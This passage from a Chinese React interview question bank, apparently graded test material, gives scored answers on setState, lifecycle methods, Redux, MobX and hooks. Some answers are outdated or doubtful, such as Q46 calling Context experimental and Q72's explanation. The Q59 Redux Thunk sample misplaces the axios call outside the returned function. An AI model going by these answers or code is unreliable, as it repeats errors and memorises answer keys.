的理解</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>该方法当props发生变化时执行，初始化render时不执行，在这个回调函数里面，你可以根据属性的变化，通过调用this.setState()来更新你的组件状态，旧的属性还是可以通过this.props来获取,这里调用更新状态是安全的，并不会触发额外的render调用。</p>\\n<p>使用好处： 在这个生命周期中，可以在子组件的render函数执行前获取新的props，从而更新子组件自己的state。 可以将数据请求放在这里进行执行，需要传的参数则从componentWillReceiveProps(nextProps)中获取。而不必将所有的请求都放在父组件中。于是该请求只会在该组件渲染时才会发出，从而减轻请求负担。</p>\\n<p>componentWillReceiveProps在初始化render的时候不会执行，它会在Component接受到新的状态(Props)时被触发，一般用于父组件状态更新时子组件的重新渲染。</p>\\n<h2>42. 哪些方法会触发 React 重新渲染？重新渲染 render 会做些什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>（1）哪些方法会触发 react 重新渲染?</p>\\n<ul>\\n<li>setState（）方法被调用</li>\\n</ul>\\n<p>setState 是 React 中最常用的命令，通常情况下，执行 setState 会触发 render。但是这里有个点值得关注，执行 setState 的时候不一定会重新渲染。当 setState 传入 null 时，并不会触发 render。</p>\\n<ul>\\n<li>父组件重新渲染</li>\\n</ul>\\n<p>只要父组件重新渲染了，其子组件都有可能重新渲染，因为父组件重新渲染了之后，所有子组件都会重新走一遍生命周期，这个时候只要子组件的 shouldComponentUpdate 或者 pureComponent 返回了 true，都会触发子组件的重新渲染。</p>\\n<p>（2）重新渲染 render 会做些什么?</p>\\n<ul>\\n<li><p>会对新旧 VNode 进行对比，也就是我们所说的Diff算法。</p>\\n</li>\\n<li><p>对新旧两棵树进行一个深度优先遍历，这样每一个节点都会一个标记，在到深度遍历的时候，每遍历到一和个节点，就把该节点和新的节点树进行对比，如果有差异就放到一个对象里面</p>\\n</li>\\n<li><p>遍历差异对象，根据差异的类型，根据对应对规则更新VNode</p>\\n</li>\\n</ul>\\n<h2>43. React如何判断什么时候重新渲染组件？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>组件状态的改变可以因为props的改变，或者直接通过setState方法改变。组件获得新的状态，然后React决定是否应该重新渲染组件。只要组件的state发生变化，React就会对组件进行重新渲染。这是因为React中的shouldComponentUpdate方法默认返回true，这就是导致每次更新都重新渲染的原因。</p>\\n<p>当React将要渲染组件时会执行shouldComponentUpdate方法来看它是否返回true（组件应该更新，也就是重新渲染）。所以需要重写shouldComponentUpdate方法让它根据情况返回true或者false来告诉React什么时候重新渲染什么时候跳过重新渲染。</p>\\n<h2>44. 在React中如何避免不必要的render？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>React 基于虚拟 DOM 和高效 Diff 算法的完美配合，实现了对 DOM 最小粒度的更新。大多数情况下，React 对 DOM 的渲染效率足以业务日常。但在个别复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，其很重要的一个方向，就是避免不必要的渲染（Render）。这里提下优化的点</p>\\n<ul>\\n<li>shouldComponentUpdate 和 PureComponent</li>\\n</ul>\\n<p>在 React 类组件中，可以利用 shouldComponentUpdate或者 PureComponent 来减少因父组件更新而触发子组件的 render，从而达到目的。shouldComponentUpdate 来决定是否组件是否重新渲染，如果不希望组件重新渲染，返回 false 即可。</p>\\n<ul>\\n<li>利用高阶组件</li>\\n</ul>\\n<p>在函数组件中，并没有 shouldComponentUpdate 这个生命周期，可以利用高阶组件，封装一个类似 PureComponet 的功能</p>\\n<ul>\\n<li>使用 React.memo</li>\\n</ul>\\n<p>React.memo 是 React 16.6 新的一个 API，用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似，但不同的是， React.memo只能用于函数组件。</p>\\n<h2>45. 对 React-Intl 的理解，它的工作原理？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>React-intl是雅虎的语言国际化开源项目FormatJS的一部分，通过其提供的组件和API可以与ReactJS绑定。</p>\\n<p>React-intl提供了两种使用方法，一种是引用React组件，另一种是直接调取API，官方更加推荐在React项目中使用前者，只有在无法使用React组件的地方，才应该调用框架提供的API。它提供了一系列的React组件，包括数字格式化、字符串格式化、日期格式化等。</p>\\n<p>在React-intl中，可以配置不同的语言包，他的工作原理就是根据需要，在语言包之间进行切换。</p>\\n<h2>46. 为什么React并不推荐优先考虑使用Context？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Context目前还处于实验阶段，可能会在后面的发行版本中有很大的变化，事实上这种情况已经发生了，所以为了避免给今后升级带来大的影响和麻烦，不建议在app中使用context。</p>\\n<p>尽管不建议在app中使用context，但是独有组件而言，由于影响范围小于app，如果可以做到高内聚，不破坏组件树之间的依赖关系，可以考虑使用context</p>\\n<p>对于组件之间的数据通信或者状态管理，有效使用props或者state解决，然后再考虑使用第三方的成熟库进行解决，以上的方法都不是最佳的方案的时候，在考虑context。</p>\\n<p>context的更新需要通过setState()触发，但是这并不是很可靠的，Context支持跨组件的访问，但是如果中间的子组件通过一些方法不影响更新，比如 shouldComponentUpdate() 返回false 那么不能保证Context的更新一定可以使用Context的子组件，因此，Context的可靠性需要关注</p>\\n<h2>47. React中的setState批量更新的过程是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>调用 setState 时，组件的 state 并不会立即改变， setState 只是把要修改的 state 放入一个队列， React 会优化真正的执行时机，并出于性能原因，会将 React 事件处理程序中的多次React 事件处理程序中的多次 setState 的状态修改合并成一次状态修改。 最终更新只产生一次组件及其子组件的重新渲染，这对于大型应用程序中的性能提升至关重要。</p>\\n<p>需要注意的是，只要同步代码还在执行，“攒起来”这个动作就不会停止。（注：这里之所以多次 +1 最终只有一次生效，是因为在同一个方法中多次 setState 的合并动作不是单纯地将更新累加。比如这里对于相同属性的设置，React 只会为其保留最后一次的更新）。</p>\\n<h2>48. React中有使用过getDefaultProps吗？它有什么作用？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>通过实现组件的getDefaultProps，对属性设置默认值（ES5的写法）：</p>\\n<pre><code class=\\"language-js\\">\\nvar ShowTitle = React.createClass({\\n  getDefaultProps:function(){\\n    return{\\n      title : &quot;React&quot;\\n    }\\n  },\\n  render : function(){\\n    return &lt;h1&gt;{this.props.title}&lt;/h1&gt;\\n  }\\n});\\n</code></pre>\\n<h2>49. React中setState的第二个参数作用是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>setState 的第二个参数是一个可选的回调函数。这个回调函数将在组件重新渲染后执行。等价于在 componentDidUpdate 生命周期内执行。通常建议使用 componentDidUpdate 来代替此方式。在这个回调函数中你可以拿到更新后 state 的值：</p>\\n<pre><code class=\\"language-js\\">\\nthis.setState({\\n    key1: newState1,\\n    key2: newState2,\\n    ...\\n}, callback) // 第二个参数是 state 更新完成后的回调函数\\n</code></pre>\\n<h2>50. React中的setState和replaceState的区别是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>（1）setState() setState()用于设置状态对象，其语法如下：</p>\\n<pre><code class=\\"language-js\\">\\nsetState(object nextState[, function callback])\\n</code></pre>\\n<ul>\\n<li><p>nextState，将要设置的新状态，该状态会和当前的state合并</p>\\n</li>\\n<li><p>callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值</p>\\n</li>\\n</ul>\\n<p>合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。</p>\\n<p>（2）replaceState() replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。其语法如下</p>\\n<pre><code class=\\"language-js\\">\\nreplaceState(object nextState[, function callback])\\n</code></pre>\\n<ul>\\n<li><p>nextState，将要设置的新状态，该状态会替换当前的state。</p>\\n</li>\\n<li><p>callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。</p>\\n</li>\\n</ul>\\n<p>总结： setState 是修改其中的部分状态，相当于 Object.assign，只是覆盖，不会减少原来的状态。而replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。</p>\\n<h2>51. 在React中组件的this.state和setState有什么区别？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>this.state通常是用来初始化state的，this.setState是用来修改state值的。如果初始化了state之后再使用this.state，之前的state会被覆盖掉，如果使用this.setState，只会替换掉相应的state值。所以，如果想要修改state的值，就需要使用setState，而不能直接修改state，直接修改state之后页面是不会更新的。</p>\\n<h2>52. 如何跟踪功能组件的卸载？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>通常，useEffect 创建的资源需要在组件离开屏幕前进行清理或重置，例如订阅或计时器标识符。\\n为此，传递给 useEffect 的函数可以返回一个清理函数。清理函数将在组件从用户界面移除之前运行，以防止内存泄漏。此外，如果组件渲染多次（通常是这种情况），则会在执行下一个效果之前清理前一个效果。</p>\\n<pre><code class=\\"language-js\\">useEffect(() =&gt; {\\n  function handleChange(value) {\\n    setValue(value);\\n  }\\n  SomeAPI.doFunction(id, handleChange);\\n\\n  return function cleanup() {\\n    SomeAPI.undoFunction(id, handleChange);\\n  };\\n})\\n</code></pre>\\n<h2>53. 什么是状态管理器？你使用或了解哪些状态管理器？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>状态管理器是一种帮助管理应用程序状态的工具或库。它为存储和管理数据提供了一个集中的存储空间或容器，应用程序中的不同组件都可以访问和更新这些数据。\\n状态管理器可以解决几个问题。首先，将数据和与之相关的逻辑从组件中分离出来是一种很好的做法。其次，当使用本地状态并在组件之间传递时，由于组件有可能深嵌套，代码可能会变得错综复杂。通过全局存储，我们可以从任何组件访问和修改数据。\\n除了 React Context，Redux 或 MobX 也常用作状态管理库。</p>\\n<h2>54. 在什么情况下可以使用本地状态，什么时候应该使用全局状态？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>如果本地状态仅在一个组件中使用并且不打算将其传递给其他组件，则建议使用本地状态。本地状态也用在表示列表中单个项目的组件中。但是，如果组件分解涉及嵌套组件且数据沿层次结构传递，则最好使用全局状态。</p>\\n<h2>55. Redux 实现了哪种模式？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>Redux 实现了Flux 模式，它是应用程序的可预测状态管理模式。它通过引入单向数据流和应用程序状态的集中存储来帮助管理应用程序的状态。</p>\\n<h2>56. 使用 Mobx 的特点是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Mobx 提供了类似observable和的装饰器computed来定义可观察的状态和反应函数。用action修饰的动作用于修改状态，确保跟踪所有更改。Mobx 还提供自动依赖跟踪、不同类型的反应、对反应性的细粒度控制，以及通过 mobx-react 包与 React 无缝集成。总体而言，Mobx 通过根据可观察状态的变化自动执行更新过程来简化状态管理。</p>\\n<h2>57. Redux和Mobx有什么区别？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Redux 是一种更简单、更有主见的状态管理库，它遵循严格的单向数据流，并提倡不变性。它需要更多的模板代码和显式更新，但与 React 的集成度很高。</p>\\n</li>\\n<li><p>Mobx 提供的 API 更灵活、更直观，模板代码更少。它允许你直接修改状态，并自动跟踪变化以获得更好的性能。在 Redux 和 Mobx 之间做出选择取决于您的具体需求和偏好。</p>\\n</li>\\n</ul>\\n<h2>58. 什么是React调和？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>调和是 React 的一种算法，用于区分一棵元素树和另一棵元素树，以确定需要替换的部分。\\n调和是我们过去所说的虚拟 DOM 背后的算法。其定义听起来是这样的：当您渲染 React 应用程序时，描述应用程序的元素树会在预留内存中生成。然后，这棵树就会被包含在呈现环境中，例如，在浏览器应用程序中，它会被转化为一组 DOM 操作。应用状态更新时，会生成新的元素树。新的树会与之前的树进行比较，以便准确计算和启用重新绘制更新后的应用程序所需的操作。</li>\\n</ul>\\n<h2>59. 如何在 Redux Thunk 中处理异步操作？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>要使用 Redux Thunk，需要将其作为中间件导入。Action创建者不应只返回一个对象，而应返回一个将dispatch 作为参数的函数。</p>\\n<pre><code class=\\"language-js\\">export const addUser = ({ firstName, lastName }) =&gt; {\\n  return dispatch =&gt; {\\n    dispatch(addUserStart());\\n  }\\n\\n  axios.post(&#39;https://jsonplaceholder.typicode.com/users&#39;, {\\n    firstName,\\n    lastName,\\n    completed: false\\n  })\\n  .then(res =&gt; {\\n    dispatch(addUserSuccess(res.data));\\n  })\\n  .catch(error =&gt; {\\n    dispatch(addUserError(error.message));\\n  })\\n}\\n</code></pre>\\n<h2>60. 如何跟踪功能组件中对象字段的变化？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>需要使用 useEffect 钩子，并将对象的字段作为依赖数组传递。</p>\\n<pre><code class=\\"language-js\\">\\nuseEffect(() =&gt; {\\n  console.log(&#39;Changed!&#39;)\\n}, [obj.someField])\\n</code></pre>\\n<h2>61. 如何访问DOM元素？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>引用是使用 React.createRef() 或 useRef() 钩子创建的，并通过 ref 属性附加到 React 元素上。通过访问创建的引用，我们可以使用 ref.current 访问 DOM 元素。</p>\\n<pre><code class=\\"language-js\\">\\nconst App = () =&gt; {\\n  const myRef = useRef(null);\\n\\n  const handleClick = () =&gt; {\\n    console.log(myRef.current); // Accessing the DOM element\\n  };\\n\\n  return (\\n    &lt;div&gt;\\n      &lt;input type=&quot;text&quot; ref={myRef} /&gt;\\n      &lt;button onClick={handleClick}&gt;Click Me&lt;/button&gt;\\n    &lt;/div&gt;\\n  );\\n}\\n\\nexport default App;\\n</code></pre>\\n<h2>62. 创建自定义钩子的规则是什么？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>钩子名称以 &quot;use &quot;开头。</p>\\n</li>\\n<li><p>钩子只能从其他钩子或 React 元素中调用。</p>\\n</li>\\n<li><p>不要有条件地调用钩子。</p>\\n</li>\\n<li><p>将可重复使用的逻辑提取到自定义钩子中。</p>\\n</li>\\n<li><p>自定义钩子必须是纯函数。</p>\\n</li>\\n<li><p>自定义钩子可以返回值或其他钩子。</p>\\n</li>\\n<li><p>以描述性的方式命名自定义钩子。</p>\\n</li>\\n</ul>\\n<h2>63. 如何不使用脚手架创建一个项目</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ol>\\n<li><p>yarn init 初始化package.json文件</p>\\n</li>\\n<li><p>安装react和react-dom</p>\\n</li>\\n<li><p>配置webpack</p>\\n</li>\\n<li><p>安装router</p>\\n</li>\\n<li><p>安装redux</p>\\n</li>\\n</ol>\\n<h2>64. react事件绑定方式有哪些</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>render方法中使用bind</p>\\n<pre><code class=\\"language-html\\">&lt;div onClick={this.handleClick.bind(this)}&gt;test&lt;/div&gt;\\n</code></pre>\\n<p>这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能</p>\\n<p>render方法中使用箭头函数</p>\\n<pre><code class=\\"language-html\\">&lt;div onClick={e =&gt; this.handleClick(e)}&gt;test&lt;/div&gt;\\n</code></pre>\\n<p>这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能</p>\\n<p>constructor中bind</p>\\n<pre><code class=\\"language-html\\">\\nthis.handleClick = this.handleClick.bind(this);\\n</code></pre>\\n<p>定义阶段使用箭头函数绑定</p>\\n<h2>65. react函数组件和类组件的区别</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>编写形式：类组件的编写形式更加的冗余</p>\\n</li>\\n<li><p>状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态</p>\\n</li>\\n<li><p>生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果</p>\\n</li>\\n<li><p>调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法</p>\\n</li>\\n<li><p>获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）</p>\\n</li>\\n</ul>\\n<h2>66. 说说React Hooks是如何解决类组件中一些常见问题的</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。</p>\\n</li>\\n<li><p>这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。</p>\\n</li>\\n<li><p>通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。</p>\\n</li>\\n<li><p>此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。</p>\\n</li>\\n</ul>\\n<h2>67. 说说React的Context API及其使用场景</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。</p>\\n</li>\\n<li><p>它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。</p>\\n</li>\\n<li><p>使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。</p>\\n</li>\\n</ul>\\n<h2>68. React18中引入的并发模式是什么，它带来了哪些改进</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>React18中引入的并发模式是一种新的渲染策略，它允许React在渲染过程中中断和恢复工作，以便更好地响应用户输入和其他高优先级任务。</p>\\n</li>\\n<li><p>通过并发模式，React可以更好地管理资源的分配和使用，提高应用的响应性和性能。</p>\\n</li>\\n<li><p>此外，并发模式还为React的未来扩展提供了基础，比如支持更复杂的动画和交互效果。</p>\\n</li>\\n</ul>\\n<h2>69. React的Suspense组件和lazy函数是如何支持代码拆分的</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>React的Suspense组件和lazy函数是React支持代码拆分的重要工具。</p>\\n</li>\\n<li><p>lazy函数允许你动态地导入React组件，这意味着你可以将组件的代码分割到单独的文件中，并在需要时再进行加载。</p>\\n</li>\\n<li><p>Suspense组件则用于指定加载指示器（如加载动画或占位符），以便在组件加载完成之前向用户展示一些反馈。</p>\\n</li>\\n<li><p>通过结合使用lazy函数和Suspense组件，你可以实现按需加载组件，提高应用的初始加载速度和性能。</p>\\n</li>\\n</ul>\\n<h2>70. React18中引入了新的startTransition API，说说它的作用以及如何使用</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>React18中引入的startTransition API用于标记那些可能需要一段时间才能完成的更新（例如，从服务器获取数据）。</p>\\n</li>\\n<li><p>这个API允许React将UI的渲染划分为优先级较低的任务和优先级较高的任务。</p>\\n</li>\\n<li><p>通过调用startTransition并传入一个回调函数，我们可以告诉React：“这个更新可以稍后完成，先处理其他更紧急的事情。”</p>\\n</li>\\n<li><p>这使得React能够在等待数据加载时保持响应性，提供更好的用户体验。</p>\\n</li>\\n</ul>\\n<h2>71. 类组件的setState和函数组件的useState异同</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>相同点</p>\\n<p>都更新视图，底部调用了scheduleUpdateFiber方法，在事件驱动情况下都有批量更新规则。</p>\\n<p>不同点</p>\\n<p>setState只要调用了就会执行更新；useState会浅比较2次state是否相同</p>\\n<p>setState有专门监听变化的回调函数；useState只能通过useEffect</p>\\n<p>setState底层处理上主要是和老的state合并；useState则重新赋值</p>\\n<h2>72. 为什么React组件中 return 一个对象而不是一个元素时会报错</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<p>因为对象不具备迭代接口，必须要时原型或者自己身上有[Symbol.iterator]属性才可以，而数组是有迭代接口的，所以可以直接迭代。</p>\\n<h2>73. React可以在哪个生命周期访问DOM，在哪个时机访问Ref？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>访问 DOM： 在 React 中，通常应该遈避免直接操作 DOM，因为 React 采用 Virtual DOM 的方式管理页面渲染。但是，如果确实需要访问真实的 DOM 元素，可以在组件的以下生命周期方法中进行</p>\\n<p>componentDidMount()：在组件挂载后立即调用。可以在这个生命周期方法中访问和操作 DOM 元素，执行初始化操作等。</p>\\n<p>componentDidUpdate(prevProps, prevState)：在组件更新后被调用。可以在此方法中根据更新后的 props 或 state 来访问或操作 DOM 元素。</p>\\n<p>访问 Ref： Ref 是用于访问真实 DOM 节点或 React 组件实例的一种方式。在 React 中，可以在以下时机访问 Ref：</p>\\n<p>使用 Ref：可以在componentDidMount()、componentDidUpdate() 或事件处理程序中访问 Ref。通过 Ref 可以获取到对应的 DOM 元素或组件实例。</p>\\n<h2>74. React为什么要校验Prop？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>React 中校验 Props 的主要目的是为了确保组件被正确使用并且传入的数据是符合预期的。通过对 Props 进行校验，可以提高代码的可靠性、可维护性和可读性，帮助开发人员尽早发现潜在的问题并减少调试时间。</p>\\n<p>数据完整性和类型安全：Props 校验可以确保组件所需的数据类型和结构是正确的，避免意外的数据类型错误或缺失。这有助于提高代码的稳定性和可靠性。</p>\\n<p>组件复用：通过校验 Props，可以明确指定组件所需的数据格式和限制条件，使其更具通用性和可复用性。其他开发人员在使用组件时能够更容易地理解如何正确传入数据。</p>\\n<p>提供清晰的接口：Props 校验定义了组件的接口规范，使得组件的用法更加清晰明了。开发人员在调用组件时可以清晰地了解需要传入哪些数据，以及这些数据的约束条件。</p>\\n<p>调试和错误检测：当传入的 Props 不符合校验规则时，React 会在开发环境下发出警告信息，帮助开发人员快速定位问题并进行修复，从而提高代码质量和可维护性。</p>\\n<h2>75. shouldComponentUpdate有什么用？为什么它很重要？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>组件状态数据或者属性数据发生更新的时候，组件会进入存在期，视图会渲染更新。在生命周期方法 should ComponentUpdate中，允许选择退出某些组件（和它们的子组件）的和解过程。</p>\\n<p>和解的最终目标是根据新的状态，以最有效的方式更新用户界面。如果我们知道用户界面的某一部分不会改变，那么没有理由让 React弄清楚它是否应该更新渲染。通过在 shouldComponentUpdate方法中返回 false, React将让当前组件及其所有子组件保持与当前组件状态相同。</p>\\n<h2>76. 如何用 React构建（ build）生产模式？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>通常，使用 Webpack的 DefinePlugin方法将 NODE ENV设置为 production。这将剥离 propType验证和额外的警告。除此之外，还可以减少代码，因为 React使用 Uglify的dead-code来消除开发代码和注释，这将大大减少包占用的空间。</p>\\n<h2>77. 在 Reducer文件里，对于返回的结果，要注意哪些问题？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>在 Reducer文件里，对于返回的结果，必须要使用 Object.assign ( )来复制一份新的 state，否则页面不会跟着数据刷新。</p>\\n<pre><code class=\\"language-js\\">\\nreturn Object. assign ( { }， state, {\\ntype:action .type,\\nshouldNotPaint : true\\n})\\n</code></pre>\\n<h2>78. 什么是 Redux Thunk？它解决了什么问题？</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Redux Thunk 是一个中间件，允许你在 action 创建函数中返回一个函数而不是一个 action 对象。这个返回的函数可以包含异步逻辑，并在适当的时候 dispatch 一个或多个 action。</p>\\n<p>解决问题：</p>\\n<p>异步操作：Redux Thunk 允许你处理异步操作，如 AJAX 请求，而不需要在 reducer 中处理异步逻辑。</p>\\n<p>复杂逻辑：可以处理复杂的业务逻辑，如条件 dispatch、多次 dispatch 等。</p>\\n<pre><code class=\\"language-js\\">\\nimport { createStore, applyMiddleware } from &#39;redux&#39;;\\nimport thunk from 